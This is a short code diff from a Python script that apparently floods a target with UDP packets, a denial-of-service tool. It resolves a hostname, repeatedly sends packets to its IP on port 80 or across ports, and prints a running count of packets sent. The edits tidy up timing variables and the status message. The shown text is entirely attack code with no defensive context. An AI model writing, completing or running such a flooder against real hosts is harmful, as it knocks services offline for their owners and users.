@@ -36,14 +36,11 @@ ip = socket.gethostbyname(url)
 
 # Value.
 sent = 0
-i = 590
-timeR = i + random.randint(0,20)
 now = datetime.datetime.now()
 dtime = now.strftime("%Y-%m-%d %H:%M:%S")
 
 # Port selection.
 port_mode = False # If 'False' all ports will be use, if 'True' - certain.
-#port = 1
 port = 80
 
 #ululu alala
@@ -60,9 +57,7 @@ if port_mode == False:  # All ports.
             
             sock.sendto(bytes, (str(ip), port))
             sent += 1
-            timeR = i + random.randint(0,20)
-            now = datetime.datetime.now()
             dtime = now.strftime("%Y-%m-%d %H:%M:%S")
-            print('\033[32;1m[%s]Sented %s packets to %s through port:1~%s\033[0m'%(dtime, sent, ip, port))       
+            print('\033[32;1m[%s]Sented %s packets to %s through port:%s\033[0m'%(dtime, sent, ip, port))       
     except:
         print('\n\033[31;1mExited\033[0m')
